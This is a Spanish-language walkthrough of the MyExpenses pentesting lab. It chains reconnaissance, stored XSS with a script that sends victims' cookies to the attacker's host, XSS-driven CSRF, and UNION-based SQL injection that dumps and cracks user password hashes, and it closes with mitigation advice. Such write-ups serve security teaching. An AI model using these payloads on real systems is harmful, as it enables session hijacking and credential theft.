# MyExpenses - Pentesting Lab

**Tags:** `#xss` `#sqli` `#reconnaissance` `#cookie-hijacking` `#web-security`

## 🎯 Resumen Ejecutivo

Este documento detalla la explotación completa de la máquina virtual MyExpenses, que simula un escenario realista de pentest web. Se identificaron y explotaron vulnerabilidades críticas de XSS y SQL Injection que permitieron la escalación de privilegios y el acceso completo al sistema.

**Vulnerabilidades encontradas:**
- Cross-Site Scripting (XSS) Stored en formularios de registro y chat
- SQL Injection en parámetro `id` de la aplicación web
- Configuración insegura de cookies de sesión
- Falta de validación de entrada en múltiples formularios

## 📋 Descripción del Escenario
Somos "Samuel Lamotte", un empleado recién despedido de la empresa "Futura Business Informática". Debido a la salida apresurada, no se pudo validar el informe de gastos del último viaje de negocios, que asciende a 750€ correspondiente a un vuelo de regreso.

**Credenciales proporcionadas:** `samuel:fzghn4lw`

**Objetivo:** Acceder al sistema y aprobar el informe de gastos pendiente.

## 🔍 Fase 1: Reconocimiento
### 1.1 Descubrimiento de Red

Realizamos un escaneo ARP para identificar hosts activos en la red local:

```bash
arp-scan -I ens33 --localnet
```

**Resultado:**
```
Interface: ens33, type: EN10MB, MAC: 00:0c:29:1d:7d:8f, IPv4: 192.168.0.188
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     be:d1:65:65:26:d1   (Unknown: locally administered)
192.168.0.131   ba:3e:d8:a8:08:a9   (Unknown: locally administered)
192.168.0.171   34:6f:24:57:38:cb   AzureWave Technology Inc.
192.168.0.248   00:0c:29:16:37:fc   VMware, Inc. ← OBJETIVO
192.168.0.254   00:05:04:03:02:01   Naray Information & Communication Enterprise
```

**🎯 Target identificado:** `192.168.0.248`

### 1.2 Verificación de Conectividad

```bash
ping 192.168.0.248
```

**Resultado:**
```
PING 192.168.0.248 (192.168.0.248) 56(84) bytes of data.
64 bytes from 192.168.0.248: icmp_seq=1 ttl=64 time=0.318 ms
64 bytes from 192.168.0.248: icmp_seq=2 ttl=64 time=0.215 ms
```

**Análisis:** TTL=64 indica que el sistema objetivo es **Linux**.  
## 🔍 Fase 2: Enumeración

### 2.1 Escaneo de Puertos

Realizamos un escaneo completo de puertos TCP:

```bash
nmap -p- -sS -n -Pn 192.168.0.248
```

**Resultado:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-09 22:00 -04
Nmap scan report for 192.168.0.248
Host is up (0.0018s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
39125/tcp open  unknown
39327/tcp open  unknown
39957/tcp open  unknown
43085/tcp open  unknown
MAC Address: 00:0C:29:16:37:FC (VMware)
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```
### 2.2 Enumeración de Servicios

Realizamos un escaneo detallado de los puertos abiertos:

```bash
nmap -sCV -p80,39125,39327,39957,43085 192.168.0.248
```

**Resultado:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-09 22:04 -04
Nmap scan report for 192.168.0.248
Host is up (0.00023s latency).
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
```

**🔍 Hallazgos importantes:**
- Servidor web Apache 2.4.25 en puerto 80
- Cookie PHPSESSID sin flag HttpOnly (vulnerabilidad potencial)
- Archivo robots.txt revela ruta administrativa: `/admin/admin.php`

### 2.3 Exploración Web Inicial 

Accedemos a la aplicación web en `http://192.168.0.248/`:

![Página principal](Pasted%20image%2020251009221239.png)

**Observaciones:**
- Interfaz de login disponible
- Intentamos acceder con las credenciales proporcionadas: `samuel:fzghn4lw`

![Intento de login fallido](Pasted%20image%2020251009221447.png)

**❌ Resultado:** Las credenciales no funcionan para el login principal.

Exploramos la ruta administrativa descubierta: `/admin/admin.php`

![Panel de administración](Pasted%20image%2020251009221644.png)

**🔍 Descubrimientos importantes:**
- Nuestro usuario está registrado como `slamotte` (no `samuel`)
- El estado de la cuenta está marcado como **INACTIVO**
- Necesitamos activar la cuenta para proceder

## ⚔️ Fase 3: Explotación

### 3.1 Análisis de Registro de Usuarios

Exploramos la funcionalidad de registro de usuarios:

![Formulario de registro](Pasted%20image%2020251009222422.png)

**🚧 Obstáculos identificados:**
- El botón de registro está deshabilitado por JavaScript
- La aplicación advierte que los nuevos usuarios aparecen como inactivos

**Bypass:** Habilitamos el botón modificando el HTML desde las herramientas del desarrollador.

![Usuario creado](Pasted%20image%2020251009223057.png)

Como era esperado, el nuevo usuario se crea pero permanece inactivo:

![Estado inactivo](Pasted%20image%2020251009223151.png)

### 3.2 Identificación de Vulnerabilidad XSS

Sospechamos la presencia de Cross-Site Scripting (XSS) en los formularios. Probamos con un payload básico:

```html
<script>alert("XSS")</script>
```

![Prueba XSS en formulario](Pasted%20image%2020251009223758.png)

Verificamos el resultado en el panel de administración `/admin/admin.php`:

![XSS confirmado](Pasted%20image%2020251009224050.png)

**✅ Confirmación:** El formulario es vulnerable a **XSS Stored**.

### 3.3 Robo de Cookies del Administrador

Preparamos un payload avanzado para capturar cookies de sesión. Creamos un archivo JavaScript malicioso:
**Archivo `script.js`:**
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.188/?cookie=' + document.cookie);
request.send();
```

**Servidor de captura:**
```bash
python3 -m http.server 80
```

**Payload XSS:**
```html
<script src="http://192.168.0.188/script.js"></script>
```

![Inyección del payload](Pasted%20image%2020251009225833.png)

**🎯 Resultado exitoso:** El servidor captura la cookie del administrador:

![Cookie capturada](Pasted%20image%2020251009230555.png)
### 3.4 Hijacking de Sesión

Intentamos usar la cookie capturada para suplantar al administrador:

![Modificación de cookie](Pasted%20image%2020251009230818.png)

**❌ Obstáculo:** El sistema implementa restricción de sesión única:

![Sesión única](Pasted%20image%2020251009230956.png)

### 3.5 Cross-Site Request Forgery (CSRF)

Analizamos la URL de activación: `http://192.168.0.248/admin/admin.php?id=16&status=active`

**Estrategia:** Usar XSS para forzar al administrador a ejecutar la activación por nosotros.

**Payload CSRF mejorado:**
```javascript
var request = new XMLHttpRequest();
request.open('POST', 'http://192.168.0.248/admin/admin.php?id=16&status=active');
request.send();
```

**✅ Resultado:** La cuenta se activa exitosamente:

![Usuario activado](Pasted%20image%2020251009231845.png)
![Confirmación de activación](Pasted%20image%2020251009232623.png)

Aplicamos la misma técnica para activar nuestra cuenta principal (`slamotte`):

![Activación de cuenta propia](Pasted%20image%2020251009232703.png)
![Acceso conseguido](Pasted%20image%2020251009232942.png)

### 3.6 Acceso a la Aplicación

Una vez activada la cuenta, accedemos con las credenciales `slamotte:fzghn4lw`:

**Funcionalidades disponibles:**

1. **Sistema de mensajería interna:**
![Chat interno](Pasted%20image%2020251009233304.png)

2. **Gestión de informes de gastos:**
![Informe de gastos](Pasted%20image%2020251009233518.png)

**🎯 Objetivo:** Enviar el informe de gastos para aprobación:

![Envío de informe](Pasted%20image%2020251009233618.png)

**❌ Problema:** El informe requiere aprobación de un superior.

**🔍 Análisis:** El perfil muestra que el manager de Samuel es **Manon Riviere**:

![Manager identificado](Pasted%20image%2020251009234006.png)

### 3.7 Escalación de Privilegios - XSS en Chat

El sistema de chat también es vulnerable a XSS. Implementamos el mismo payload para capturar cookies de otros usuarios:

```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.188:4545/?cookie=' + document.cookie);
request.send();
```

**🎯 Resultado:** Capturamos múltiples cookies de sesión:

![Múltiples cookies capturadas](Pasted%20image%2020251010000546.png)

Probamos las cookies hasta encontrar la de Manon Riviere:

![Acceso como Manon Riviere](Pasted%20image%2020251010001018.png)

**✅ Éxito:** Accedemos como Manon Riviere y encontramos nuestro informe pendiente:

![Informe para aprobar](Pasted%20image%2020251010001208.png)

Aprobamos el informe, pero necesitamos aprobación financiera adicional. En `/admin/admin.php` identificamos usuarios con permisos financieros:

![Usuarios financieros](Pasted%20image%2020251010001541.png)

**🔍 Análisis:** Manon Riviere reporta a Paul Baudouin, quien tiene permisos financieros:

![Paul Baudouin identificado](Pasted%20image%2020251010001835.png)

### 3.8 SQL Injection Discovery

Explorando la funcionalidad de Manon Riviere, encontramos un parámetro sospechoso:
`http://192.168.0.248/site.php?id=2`

![Parámetro vulnerable](Pasted%20image%2020251010002652.png)

**Prueba de SQL Injection:**
```sql
http://192.168.0.248/site.php?id=2 union select 1,2-- -
```

![Confirmación SQLi](Pasted%20image%2020251010003554.png)

**✅ Confirmación:** El parámetro `id` es vulnerable a SQL Injection.

### 3.9 Explotación de SQL Injection

**Enumeración de base de datos:**
```sql
http://192.168.0.248/site.php?id=2 union select 1,database()-- -
```

![Base de datos identificada](Pasted%20image%2020251010004006.png)

**Enumeración de tablas:**
```sql
http://192.168.0.248/site.php?id=2 union select 1,table_name from information_schema.tables-- -
```

![Tablas enumeradas](Pasted%20image%2020251010004433.png)

**Enumeración de columnas de la tabla `user`:**
```sql
http://192.168.0.248/site.php?id=2 union select 1,column_name from information_schema.columns where table_schema="myexpense" and table_name="user"-- -
```

![Columnas identificadas](Pasted%20image%2020251010005120.png)

**Extracción de credenciales:**
```sql
http://192.168.0.248/site.php?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
```

![Credenciales extraídas](Pasted%20image%2020251010005856.png)  

**Credenciales en formato raw:**
```
afoulon:124922b5d61dd31177ec83719ef8110a,pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a,rlefrancois:ef0dafa5f531b54bf1f09592df1cd110,mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc,mnguyen:f7111a83d50584e3f91d85c3db710708,pgervais:2ba907839d9b2d94be46aa27cec150e5,placombe:04d1634c2bfffa62386da699bb79f191,triou:6c26031f0e0859a5716a27d2902585c7,broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27,brenaud:2204079caddd265cedb20d661e35ddc9,slamotte:21989af1d818ad73741dfdbef642b28f,nthomas:a085d095e552db5d0ea9c455b4e99a30,vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3,rmasson:ebfc0985501fee33b9ff2f2734011882,elvis:b3128063ef51bd7d61ceee104346526b,jhon:25d55ad283aa400af464c76d713c07ad,jhonelvis:5e8667a439c68f5145dd2fcbecf02209
```

**Organización de datos:**
```bash
echo 'afoulon:124922b5d61dd31177ec83719ef8110a,pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a,rlefrancois:ef0dafa5f531b54bf1f09592df1cd110,mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc,mnguyen:f7111a83d50584e3f91d85c3db710708,pgervais:2ba907839d9b2d94be46aa27cec150e5,placombe:04d1634c2bfffa62386da699bb79f191,triou:6c26031f0e0859a5716a27d2902585c7,broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27,brenaud:2204079caddd265cedb20d661e35ddc9,slamotte:21989af1d818ad73741dfdbef642b28f,nthomas:a085d095e552db5d0ea9c455b4e99a30,vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3,rmasson:ebfc0985501fee33b9ff2f2734011882,elvis:b3128063ef51bd7d61ceee104346526b,jhon:25d55ad283aa400af464c76d713c07ad,jhonelvis:5e8667a439c68f5145dd2fcbecf02209' | tr ',' '\n' | sort -t: -k2,2 | column -t -s:
```

![Lista organizada](Pasted%20image%2020251010010911.png)

### 3.10 Cracking de Hash MD5

**Objetivo:** `pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a`

Utilizamos CrackStation para romper el hash MD5:

![Hash crackeado](Pasted%20image%2020251010011150.png)

**✅ Resultado:** `pbaudouin:HackMe`

## 🏆 Fase 4: Post-Explotación

Accedemos con las credenciales de Paul Baudouin y aprobamos el informe financiero:

![Aprobación final](Pasted%20image%2020251010011559.png)

Regresamos a la cuenta de Samuel para verificar el éxito:

![Flag obtenida](Pasted%20image%2020251010011828.png)

**🎯 MISIÓN COMPLETADA - FLAG OBTENIDA** 🎯

## 📊 Resumen de Vulnerabilidades Explotadas

| Vulnerabilidad | Severidad | Ubicación | Impacto |
|---|---|---|---|
| **XSS Stored** | Alta | Formulario de registro | Robo de cookies de sesión |
| **XSS Stored** | Alta | Sistema de chat | Escalación lateral de privilegios |
| **CSRF** | Media | Panel administrativo | Activación no autorizada de cuentas |
| **SQL Injection** | Crítica | `site.php?id=` | Extracción completa de base de datos |
| **Configuración insegura** | Media | Cookies de sesión | Falta de flag HttpOnly |
| **Hashes débiles** | Media | Base de datos | Uso de MD5 sin salt |

## 🛡️ Recomendaciones de Mitigación

### Inmediatas (Críticas)
1. **Sanitización de entrada:** Implementar validación y escape de todos los inputs del usuario
2. **Consultas preparadas:** Reemplazar todas las consultas SQL dinámicas con prepared statements
3. **Configuración de cookies:** Añadir flags `HttpOnly` y `Secure` a todas las cookies de sesión

### A corto plazo
1. **Política de contraseñas:** Implementar hashing fuerte (bcrypt/scrypt) con salt único
2. **Tokens CSRF:** Implementar tokens anti-CSRF en todos los formularios críticos
3. **Validación de sesiones:** Mejorar el control de sesiones únicas por usuario

### A largo plazo
1. **WAF (Web Application Firewall):** Implementar filtrado de ataques comunes
2. **Auditorías regulares:** Establecer proceso de pentesting periódico
3. **Capacitación:** Formación del equipo de desarrollo en secure coding

## 🎓 Lecciones Aprendidas

1. **Chain de vulnerabilidades:** Una sola vulnerabilidad puede llevar a comprometer todo el sistema
2. **Defensa en profundidad:** Es crucial implementar múltiples capas de seguridad
3. **Validación de entrada:** Nunca confiar en datos del usuario sin validación apropiada
4. **Principio de menor privilegio:** Los usuarios deben tener solo los permisos mínimos necesarios

## 🔗 Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---
**Elaborado por:** Elvis  
**Fecha:** 13 de octubre de 2025  
**Laboratorio:** MyExpenses Pentesting Challenge